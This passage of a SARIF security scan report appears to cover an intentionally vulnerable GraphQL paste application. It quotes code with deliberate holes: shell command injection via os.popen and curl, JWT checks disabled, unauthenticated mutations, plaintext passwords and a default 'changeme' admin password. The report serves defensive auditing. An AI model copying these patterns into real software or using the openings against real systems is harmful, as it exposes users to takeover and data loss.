\"endLine\": 211,\n                  \"snippet\": {\n                    \"text\": \"def mutate(self, info, host='pastebin.com', port=443, path='/', scheme=\\\"http\\\"):\\n    url = security.strip_dangerous_characters(f\\\"{scheme}://{host}:{port}{path}\\\")\\n    cmd = helpers.run_cmd(f'curl --insecure {url}')\"\n                  }\n                }\n              }\n            }\n          ],\n          \"partialFingerprints\": {\n            \"primaryLocationLineHash\": \"cwe-78-import-paste-command-injection\"\n          },\n          \"properties\": {\n            \"security-severity\": \"5.0\",\n            \"sec-af/verdict\": \"confirmed\",\n            \"sec-af/evidence_level\": 6,\n            \"sec-af/exploitability_score\": 5.0,\n            \"sec-af/chain_id\": null,\n            \"sec-af/compliance\": [\n              \"PCI-DSS:Req-6.2.4\",\n              \"SOC2:CC7\",\n              \"OWASP:A03:2021\",\n              \"HIPAA:\\u00a7164.312(c)(1)\",\n              \"ISO27001:A.8.28\"\n            ],\n            \"tags\": [\n              \"CWE-78\",\n              \"compliance:HIPAA:\\u00a7164.312(c)(1)\",\n              \"compliance:ISO27001:A.8.28\",\n              \"compliance:OWASP:A03:2021\",\n              \"compliance:PCI-DSS:Req-6.2.4\",\n              \"compliance:SOC2:CC7\",\n              \"security\"\n            ]\n          },\n          \"relatedLocations\": [\n            {\n              \"id\": 1,\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/helpers.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 8,\n                  \"endLine\": 9,\n                  \"snippet\": {\n                    \"text\": \"def run_cmd(cmd):\\n  return os.popen(cmd).read()\"\n                  }\n                }\n              },\n              \"message\": {\n                \"text\": \"Related location\"\n              }\n            },\n            {\n              \"id\": 2,\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/security.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 41,\n                  \"endLine\": 46,\n                  \"snippet\": {\n                    \"text\": \"def strip_dangerous_characters(cmd):\\n  if helpers.is_level_easy():\\n    return cmd\\n  elif helpers.is_level_hard():\\n    return cmd.replace(';','').replace('&', '')\\n  return cmd\"\n                  }\n                }\n              },\n              \"message\": {\n                \"text\": \"Related location\"\n              }\n            }\n          ],\n          \"codeFlows\": [\n            {\n              \"threadFlows\": [\n                {\n                  \"locations\": [\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 204\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"GraphQL mutation accepts host, port, path, scheme as user-controlled arguments\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 210\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"User input interpolated into URL string\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 210\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"strip_dangerous_characters called with insufficient sanitization\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/helpers.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 9\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"os.popen executes command via shell with tainted input\"\n                        }\n                      }\n                    }\n                  ]\n                }\n              ]\n            }\n          ]\n        },\n        {\n          \"ruleId\": \"sec-af/sast/os-command-injection\",\n          \"level\": \"error\",\n          \"message\": {\n            \"text\": \"[CONFIRMED] OS Command Injection in system_diagnostics query: The system_diagnostics GraphQL query accepts a cmd parameter that is passed to helpers.run_cmd(). While there is an allowed_cmds check in security.py, in 'easy' mode (default), this check returns True for all commands, allowing arbitrary command execution.. Evidence level: FULL_EXPLOIT.\"\n          },\n          \"locations\": [\n            {\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/views.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 344,\n                  \"endLine\": 345,\n                  \"snippet\": {\n                    \"text\": \"if security.allowed_cmds(cmd):\\n  output = helpers.run_cmd(cmd)\"\n                  }\n                }\n              }\n            }\n          ],\n          \"partialFingerprints\": {\n            \"primaryLocationLineHash\": \"cwe-78-system-diagnostics-cmd\"\n          },\n          \"properties\": {\n            \"security-severity\": \"5.0\",\n            \"sec-af/verdict\": \"confirmed\",\n            \"sec-af/evidence_level\": 6,\n            \"sec-af/exploitability_score\": 5.0,\n            \"sec-af/chain_id\": null,\n            \"sec-af/compliance\": [\n              \"PCI-DSS:Req-6.2.4\",\n              \"SOC2:CC7\",\n              \"OWASP:A03:2021\",\n              \"HIPAA:\\u00a7164.312(c)(1)\",\n              \"ISO27001:A.8.28\"\n            ],\n            \"tags\": [\n              \"CWE-78\",\n              \"OWASP-A1:2017-Injection\",\n              \"command-injection\",\n              \"compliance:HIPAA:\\u00a7164.312(c)(1)\",\n              \"compliance:ISO27001:A.8.28\",\n              \"compliance:OWASP:A03:2021\",\n              \"compliance:PCI-DSS:Req-6.2.4\",\n              \"compliance:SOC2:CC7\",\n              \"graphql\",\n              \"os-command\",\n              \"security\"\n            ]\n          },\n          \"relatedLocations\": [\n            {\n              \"id\": 1,\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/security.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 33,\n                  \"endLine\": 39,\n                  \"snippet\": {\n                    \"text\": \"def allowed_cmds(cmd):\\n  if helpers.is_level_easy():\\n    return True\\n  elif helpers.is_level_hard():\\n    if cmd.startswith(('echo', 'ps' 'whoami', 'tail')):\\n      return True\\n  return False\"\n                  }\n                }\n              },\n              \"message\": {\n                \"text\": \"Related location\"\n              }\n            },\n            {\n              \"id\": 2,\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/helpers.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 8,\n                  \"endLine\": 9,\n                  \"snippet\": {\n                    \"text\": \"def run_cmd(cmd):\\n  return os.popen(cmd).read()\"\n                  }\n                }\n              },\n              \"message\": {\n                \"text\": \"Related location\"\n              }\n            }\n          ],\n          \"codeFlows\": [\n            {\n              \"threadFlows\": [\n                {\n                  \"locations\": [\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 273\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"GraphQL field definition accepts cmd parameter\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 337\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"resolve_system_diagnostics receives cmd from GraphQL query\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/security.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 34\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"allowed_cmds() returns True in easy mode (is_level_easy())\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 345\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"cmd passed to helpers.run_cmd()\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/helpers.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 9\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"os.popen(cmd).read() executes shell command\"\n                        }\n                      }\n                    }\n                  ]\n                }\n              ]\n            }\n          ]\n        },\n        {\n          \"ruleId\": \"sec-af/config/improper-authentication\",\n          \"level\": \"error\",\n          \"message\": {\n            \"text\": \"[CONFIRMED] JWT Signature and Expiration Verification Disabled: JWT token signature and expiration verification is disabled (verify_signature=False, verify_exp=False), allowing attackers to forge tokens, impersonate any user, and use expired tokens indefinitely. This is a critical authentication bypass vulnerability.. Evidence level: FULL_EXPLOIT.\"\n          },\n          \"locations\": [\n            {\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/helpers.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 20,\n                  \"endLine\": 21,\n                  \"snippet\": {\n                    \"text\": \"def get_identity(token):\\n  return decode(token, options={\\\"verify_signature\\\":False, \\\"verify_exp\\\":False}).get('identity')\"\n                  }\n                }\n              }\n            }\n          ],\n          \"partialFingerprints\": {\n            \"primaryLocationLineHash\": \"config_jwt_signature_disabled_core_helpers_21\"\n          },\n          \"properties\": {\n            \"security-severity\": \"5.0\",\n            \"sec-af/verdict\": \"confirmed\",\n            \"sec-af/evidence_level\": 6,\n            \"sec-af/exploitability_score\": 5.0,\n            \"sec-af/chain_id\": null,\n            \"sec-af/compliance\": [\n              \"PCI-DSS:Req-8\",\n              \"SOC2:CC6\",\n              \"OWASP:A07:2021\",\n              \"HIPAA:\\u00a7164.312(d)\",\n              \"ISO27001:A.5.17\"\n            ],\n            \"tags\": [\n              \"CWE-287\",\n              \"compliance:HIPAA:\\u00a7164.312(d)\",\n              \"compliance:ISO27001:A.5.17\",\n              \"compliance:OWASP:A07:2021\",\n              \"compliance:PCI-DSS:Req-8\",\n              \"compliance:SOC2:CC6\",\n              \"security\"\n            ]\n          },\n          \"codeFlows\": [\n            {\n              \"threadFlows\": [\n                {\n                  \"locations\": [\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 281\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"GraphQL 'me' field accepts token parameter from user input\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 286\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"Token passed to get_identity() function\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/helpers.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 21\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"JWT decoded without signature or expiration verification\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 295\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"Identity from JWT used to query database for user\"\n                        }\n                      }\n                    }\n                  ]\n                }\n              ]\n            }\n          ]\n        },\n        {\n          \"ruleId\": \"sec-af/api/missing-authentication-critical-function\",\n          \"level\": \"error\",\n          \"message\": {\n            \"text\": \"[CONFIRMED] Missing Authentication for CreateUser Mutation: The CreateUser GraphQL mutation allows any unauthenticated user to create new user accounts. No authentication check, JWT verification, or authorization is performed before creating user accounts.. Evidence level: FULL_EXPLOIT.\"\n          },\n          \"locations\": [\n            {\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/views.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 92,\n                  \"endLine\": 107\n                }\n              }\n            }\n          ],\n          \"partialFingerprints\": {\n            \"primaryLocationLineHash\": \"api-missing-auth-createuser-001\"\n          },\n          \"properties\": {\n            \"security-severity\": \"5.0\",\n            \"sec-af/verdict\": \"confirmed\",\n            \"sec-af/evidence_level\": 6,\n            \"sec-af/exploitability_score\": 5.0,\n            \"sec-af/chain_id\": null,\n            \"sec-af/compliance\": [\n              \"PCI-DSS:Req-8\",\n              \"SOC2:CC6\",\n              \"OWASP:A07:2021\",\n              \"HIPAA:\\u00a7164.312(a)(1)\",\n              \"ISO27001:A.5.15\"\n            ],\n            \"tags\": [\n              \"CWE-306\",\n              \"OWASP-A7:2017 - Missing Function Level Access Control\",\n              \"api\",\n              \"authentication\",\n              \"compliance:HIPAA:\\u00a7164.312(a)(1)\",\n              \"compliance:ISO27001:A.5.15\",\n              \"compliance:OWASP:A07:2021\",\n              \"compliance:PCI-DSS:Req-8\",\n              \"compliance:SOC2:CC6\",\n              \"graphql\",\n              \"missing-auth\",\n              \"security\"\n            ]\n          },\n          \"relatedLocations\": [\n            {\n              \"id\": 1,\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/views.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 243,\n                  \"endLine\": 250,\n                  \"snippet\": {\n                    \"text\": \"class Mutations(graphene.ObjectType):\\n  create_paste = CreatePaste.Field()\\n  edit_paste = EditPaste.Field()\\n  delete_paste = DeletePaste.Field()\\n  upload_paste = UploadPaste.Field()\\n  import_paste = ImportPaste.Field()\\n  create_user = CreateUser.Field()\\n  login = Login.Field()\"\n                  }\n                }\n              },\n              \"message\": {\n                \"text\": \"Related location\"\n              }\n            }\n          ]\n        },\n        {\n          \"ruleId\": \"sec-af/api/missing-authentication-critical-function\",\n          \"level\": \"error\",\n          \"message\": {\n            \"text\": \"[CONFIRMED] Missing Authentication for UploadPaste Mutation: The UploadPaste GraphQL mutation allows unauthenticated file uploads to the server filesystem.. Evidence level: FULL_EXPLOIT.\"\n          },\n          \"locations\": [\n            {\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/views.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 185,\n                  \"endLine\": 198\n                }\n              }\n            }\n          ],\n          \"partialFingerprints\": {\n            \"primaryLocationLineHash\": \"uploadpaste-missing-auth\"\n          },\n          \"properties\": {\n            \"security-severity\": \"5.0\",\n            \"sec-af/verdict\": \"confirmed\",\n            \"sec-af/evidence_level\": 6,\n            \"sec-af/exploitability_score\": 5.0,\n            \"sec-af/chain_id\": null,\n            \"sec-af/compliance\": [\n              \"PCI-DSS:Req-8\",\n              \"SOC2:CC6\",\n              \"OWASP:A07:2021\",\n              \"HIPAA:\\u00a7164.312(a)(1)\",\n              \"ISO27001:A.5.15\"\n            ],\n            \"tags\": [\n              \"CWE-306\",\n              \"compliance:HIPAA:\\u00a7164.312(a)(1)\",\n              \"compliance:ISO27001:A.5.15\",\n              \"compliance:OWASP:A07:2021\",\n              \"compliance:PCI-DSS:Req-8\",\n              \"compliance:SOC2:CC6\",\n              \"security\"\n            ]\n          },\n          \"codeFlows\": [\n            {\n              \"threadFlows\": [\n                {\n                  \"locations\": [\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 185\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"UploadPaste.mutate accepts filename and content from GraphQL input without authentication check\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/helpers.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 25\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"save_file writes to WEB_UPLOADDIR + filename without path validation\"\n                        }\n                      }\n                    }\n                  ]\n                }\n              ]\n            }\n          ]\n        },\n        {\n          \"ruleId\": \"sec-af/api/missing-authentication-critical-function\",\n          \"level\": \"error\",\n          \"message\": {\n            \"text\": \"[CONFIRMED] Missing Authentication for ImportPaste Mutation: The ImportPaste GraphQL mutation allows unauthenticated SSRF and command injection attacks by fetching arbitrary URLs via curl with insufficient input sanitization.. Evidence level: FULL_EXPLOIT.\"\n          },\n          \"locations\": [\n            {\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/views.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 209,\n                  \"endLine\": 223\n                }\n              }\n            }\n          ],\n          \"partialFingerprints\": {\n            \"primaryLocationLineHash\": \"cwe-306-import-paste-mutation-unauthenticated-ssrf\"\n          },\n          \"properties\": {\n            \"security-severity\": \"5.0\",\n            \"sec-af/verdict\": \"confirmed\",\n            \"sec-af/evidence_level\": 6,\n            \"sec-af/exploitability_score\": 5.0,\n            \"sec-af/chain_id\": null,\n            \"sec-af/compliance\": [\n              \"PCI-DSS:Req-8\",\n              \"SOC2:CC6\",\n              \"OWASP:A07:2021\",\n              \"HIPAA:\\u00a7164.312(a)(1)\",\n              \"ISO27001:A.5.15\"\n            ],\n            \"tags\": [\n              \"CWE-306\",\n              \"compliance:HIPAA:\\u00a7164.312(a)(1)\",\n              \"compliance:ISO27001:A.5.15\",\n              \"compliance:OWASP:A07:2021\",\n              \"compliance:PCI-DSS:Req-8\",\n              \"compliance:SOC2:CC6\",\n              \"security\"\n            ]\n          },\n          \"codeFlows\": [\n            {\n              \"threadFlows\": [\n                {\n                  \"locations\": [\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 209\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"ImportPaste.mutate() accepts user-controlled host, port, path, scheme parameters\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 210\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"Parameters concatenated into URL without proper validation\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/security.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 41\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"strip_dangerous_characters() only removes ; and & in hard mode, does nothing in easy mode\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/helpers.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 9\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"os.popen(cmd) executes shell command without validation\"\n                        }\n                      }\n                    }\n                  ]\n                }\n              ]\n            }\n          ]\n        },\n        {\n          \"ruleId\": \"sec-af/api/missing-authentication-for-critical-function\",\n          \"level\": \"error\",\n          \"message\": {\n            \"text\": \"[CONFIRMED] Missing Authentication for system_diagnostics Query: The system_diagnostics GraphQL query allows unauthenticated command execution with arbitrary commands.. Evidence level: FULL_EXPLOIT.\"\n          },\n          \"locations\": [\n            {\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/views.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 337,\n                  \"endLine\": 347,\n                  \"snippet\": {\n                    \"text\": \"def resolve_system_diagnostics(self, info, username, password, cmd='whoami'):\\n    q = User.query.filter_by(username='admin').first()\\n    real_passw = q.password\\n    res, msg = security.check_creds(username, password, real_passw)\\n    Audit.create_audit_entry(info)\\n    if res:\\n      output = f'{cmd}: command not found'\\n      if security.allowed_cmds(cmd):\\n        output = helpers.run_cmd(cmd)\\n      return output\\n    return msg\"\n                  }\n                }\n              }\n            }\n          ],\n          \"partialFingerprints\": {\n            \"primaryLocationLineHash\": \"api-missing-auth-system-diagnostics-337\"\n          },\n          \"properties\": {\n            \"security-severity\": \"5.0\",\n            \"sec-af/verdict\": \"confirmed\",\n            \"sec-af/evidence_level\": 6,\n            \"sec-af/exploitability_score\": 5.0,\n            \"sec-af/chain_id\": null,\n            \"sec-af/compliance\": [\n              \"PCI-DSS:Req-8\",\n              \"SOC2:CC6\",\n              \"OWASP:A07:2021\",\n              \"HIPAA:\\u00a7164.312(a)(1)\",\n              \"ISO27001:A.5.15\"\n            ],\n            \"tags\": [\n              \"CWE-306\",\n              \"compliance:HIPAA:\\u00a7164.312(a)(1)\",\n              \"compliance:ISO27001:A.5.15\",\n              \"compliance:OWASP:A07:2021\",\n              \"compliance:PCI-DSS:Req-8\",\n              \"compliance:SOC2:CC6\",\n              \"security\"\n            ]\n          },\n          \"relatedLocations\": [\n            {\n              \"id\": 1,\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/security.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 33,\n                  \"endLine\": 39,\n                  \"snippet\": {\n                    \"text\": \"def allowed_cmds(cmd):\\n  if helpers.is_level_easy():\\n    return True\\n  elif helpers.is_level_hard():\\n    if cmd.startswith(('echo', 'ps' 'whoami', 'tail')):\\n      return True\\n  return False\"\n                  }\n                }\n              },\n              \"message\": {\n                \"text\": \"Related location\"\n              }\n            },\n            {\n              \"id\": 2,\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/helpers.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 8,\n                  \"endLine\": 9,\n                  \"snippet\": {\n                    \"text\": \"def run_cmd(cmd):\\n  return os.popen(cmd).read()\"\n                  }\n                }\n              },\n              \"message\": {\n                \"text\": \"Related location\"\n              }\n            },\n            {\n              \"id\": 3,\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"setup.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 48,\n                  \"endLine\": 50,\n                  \"snippet\": {\n                    \"text\": \"def random_password():\\n  weak_passwords = ['changeme']\\n  return random.choice(weak_passwords)\"\n                  }\n                }\n              },\n              \"message\": {\n                \"text\": \"Related location\"\n              }\n            }\n          ],\n          \"codeFlows\": [\n            {\n              \"threadFlows\": [\n                {\n                  \"locations\": [\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 273\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"GraphQL schema defines system_diagnostics query with username, password, cmd parameters\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 337\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"resolve_system_diagnostics accepts cmd parameter with default 'whoami'\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/views.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 340\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"security.check_creds validates username='admin' and password='changeme' (default admin password from setup.py)\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/security.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 34\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"allowed_cmds returns True for all commands in easy mode (default)\"\n                        }\n                      }\n                    },\n                    {\n                      \"location\": {\n                        \"physicalLocation\": {\n                          \"artifactLocation\": {\n                            \"uri\": \"core/helpers.py\"\n                          },\n                          \"region\": {\n                            \"startLine\": 9\n                          }\n                        },\n                        \"message\": {\n                          \"text\": \"run_cmd uses os.popen(cmd).read() to execute command without sanitization\"\n                        }\n                      }\n                    }\n                  ]\n                }\n              ]\n            }\n          ]\n        },\n        {\n          \"ruleId\": \"sec-af/api/missing-authentication-critical-function\",\n          \"level\": \"error\",\n          \"message\": {\n            \"text\": \"[CONFIRMED] Missing Authentication for system_debug Query: The system_debug GraphQL query allows unauthenticated command execution via ps command injection.. Evidence level: FULL_EXPLOIT.\"\n          },\n          \"locations\": [\n            {\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/views.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 349,\n                  \"endLine\": 355,\n                  \"snippet\": {\n                    \"text\": \"def resolve_system_debug(self, info, arg=None):\\n    Audit.create_audit_entry(info)\\n    if arg:\\n      output = helpers.run_cmd('ps {}'.format(arg))\\n    else:\\n      output = helpers.run_cmd('ps')\\n    return output\"\n                  }\n                }\n              }\n            }\n          ],\n          \"partialFingerprints\": {\n            \"primaryLocationLineHash\": \"system_debug_missing_auth_command_injection\"\n          },\n          \"properties\": {\n            \"security-severity\": \"5.0\",\n            \"sec-af/verdict\": \"confirmed\",\n            \"sec-af/evidence_level\": 6,\n            \"sec-af/exploitability_score\": 5.0,\n            \"sec-af/chain_id\": null,\n            \"sec-af/compliance\": [\n              \"PCI-DSS:Req-8\",\n              \"SOC2:CC6\",\n              \"OWASP:A07:2021\",\n              \"HIPAA:\\u00a7164.312(a)(1)\",\n              \"ISO27001:A.5.15\"\n            ],\n            \"tags\": [\n              \"CWE-306\",\n              \"compliance:HIPAA:\\u00a7164.312(a)(1)\",\n              \"compliance:ISO27001:A.5.15\",\n              \"compliance:OWASP:A07:2021\",\n              \"compliance:PCI-DSS:Req-8\",\n              \"compliance:SOC2:CC6\",\n              \"security\"\n            ]\n          }\n        },\n        {\n          \"ruleId\": \"sec-af/api/missing-authentication\",\n          \"level\": \"error\",\n          \"message\": {\n            \"text\": \"[CONFIRMED] Missing Authentication for delete_all_pastes Query: The delete_all_pastes GraphQL query allows unauthenticated mass deletion of all paste data.. Evidence level: FULL_EXPLOIT.\"\n          },\n          \"locations\": [\n            {\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/views.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 385,\n                  \"endLine\": 389\n                }\n              }\n            }\n          ],\n          \"partialFingerprints\": {\n            \"primaryLocationLineHash\": \"cwe-306-missing-auth-delete-all-pastes\"\n          },\n          \"properties\": {\n            \"security-severity\": \"5.0\",\n            \"sec-af/verdict\": \"confirmed\",\n            \"sec-af/evidence_level\": 6,\n            \"sec-af/exploitability_score\": 5.0,\n            \"sec-af/chain_id\": null,\n            \"sec-af/compliance\": [\n              \"PCI-DSS:Req-8\",\n              \"SOC2:CC6\",\n              \"OWASP:A07:2021\",\n              \"HIPAA:\\u00a7164.312(a)(1)\",\n              \"ISO27001:A.5.15\"\n            ],\n            \"tags\": [\n              \"CWE-306\",\n              \"compliance:HIPAA:\\u00a7164.312(a)(1)\",\n              \"compliance:ISO27001:A.5.15\",\n              \"compliance:OWASP:A07:2021\",\n              \"compliance:PCI-DSS:Req-8\",\n              \"compliance:SOC2:CC6\",\n              \"security\"\n            ]\n          },\n          \"relatedLocations\": [\n            {\n              \"id\": 1,\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/views.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 280,\n                  \"endLine\": 280,\n                  \"snippet\": {\n                    \"text\": \"delete_all_pastes = graphene.Boolean()\"\n                  }\n                }\n              },\n              \"message\": {\n                \"text\": \"Related location\"\n              }\n            }\n          ]\n        },\n        {\n          \"ruleId\": \"sec-af/sast/cwe-312-cleartext-storage-of-sensitive-data\",\n          \"level\": \"error\",\n          \"message\": {\n            \"text\": \"[CONFIRMED] Plaintext Password Storage in Database Model: The User model stores passwords in plaintext without any hashing. The password field is defined as a plain String column (db.String(60)) and the login mutation directly compares plaintext passwords using filter_by(username=username, password=password). This exposes user credentials in the database and makes them vulnerable to theft.. Evidence level: FULL_EXPLOIT.\"\n          },\n          \"locations\": [\n            {\n              \"physicalLocation\": {\n                \"artifactLocation\": {\n                  \"uri\": \"core/models.py\",\n                  \"uriBaseId\": \"%SRCROOT%\"\n                },\n                \"region\": {\n                  \"startLine\": 9,\n                  \"endLine\": 14,\n                  \"snippet\": {\n                    \"text\": \"class User(db.Model):\\n    __tablename__ = 'users'\\n    id = db.Column(db.Integer, primary_key=True)\\n    username = db.Column(db.String(20),unique=True,nullable=False)\\n    email = db.Column(db.String(20),unique=True,nullable=False)\\n    password = db.Column(db.String(60),nullable=False)\"\n                  }\n                }\n              }\n            }\n          ],\n          \"partialFingerprints\": {\n            \"primaryLocationLineHash\": \" plaintext_password_storage\"\n          },\n          \"properties\": {\n            \"security-severity\": \"4.0\",\n            \"sec-af/verdict\": \"confirmed\",\n            \"sec-af/evidence_level\": 6,\n            \"sec-af/exploitability_score\": 4.0,\n            \"sec-af/chain_id\": null,\n            \"sec-af/compliance\": [\n              \"PCI-DSS:Req-3\",\n              \"SOC2:CC6\",\n              \"OWASP:A02:2021\",\n              \"HIPAA:\\u00a7164.312(a)(2)(iv)\",\n              \"ISO27001:A.8.24\"\n            ],\n            \"tags\": [\n              \"CWE-312\",\n              \"compliance:HIPAA:\\u00a7164.312(a)(2)(iv)\",\n              